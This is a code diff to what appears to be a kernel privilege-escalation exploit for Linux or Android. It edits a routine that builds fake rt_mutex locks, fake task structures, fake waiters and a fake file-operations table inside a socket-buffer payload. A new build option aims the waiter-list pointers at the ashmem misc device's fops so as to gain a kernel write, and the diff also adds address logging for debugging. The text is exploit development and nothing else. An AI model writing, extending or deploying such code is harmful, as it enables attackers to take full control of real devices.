@@ -775,6 +775,12 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t lock = payload_base + lock_off;
         uintptr_t waiter = payload_base + waiter_off;
 
+        if (chunk == 0) {
+          pr_info("slide bank slot=%zu parent=%016zx target=%016zx "
+                  "task=%016zx lock=%016zx waiter=%016zx\n",
+                  slot, parent, target, task, lock, waiter);
+        }
+
         put32(p, lock_off + 0x00, 0);
         put64(p, lock_off + 0x08, waiter);
         put64(p, lock_off + 0x10, waiter);
@@ -913,8 +919,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, SLIDE_LOCK_OWNER_VALUE);
     } else {
+#if defined(SLIDE_FOPS_PI_LEFT_CHAIN) && SLIDE_FOPS_PI_LEFT_CHAIN
+      uintptr_t lock_waiter =
+          payload_mode == PAGE_PAYLOAD_FOPS ? payload_base + SLIDE_FOPS_WAITER_OFF
+                                            : fake_w0;
+      put64(p, LOCK_OFF + 0x08, lock_waiter);
+      put64(p, LOCK_OFF + 0x10, lock_waiter);
+#else
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
+#endif
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
@@ -926,8 +940,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
+#if defined(SLIDE_FOPS_PI_LEFT_CHAIN) && SLIDE_FOPS_PI_LEFT_CHAIN
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            data_addr(ASHMEM_MISC_FOPS) - 8);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+            data_addr(ASHMEM_MISC_FOPS) - 8);
+#else
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+#endif
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -948,6 +969,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
+#if defined(SLIDE_FOPS_PI_LEFT_CHAIN) && SLIDE_FOPS_PI_LEFT_CHAIN
+      put_fake_waiter(p, SLIDE_FOPS_WAITER_OFF, 1, 0, 0, write_pc,
+                      data_addr(ASHMEM_MISC_FOPS) - 8, 0, waiter_task,
+                      fake_lock, waiter_prio);
+#endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_FOPS_TABLE_MIRROR_OFF)
       /*
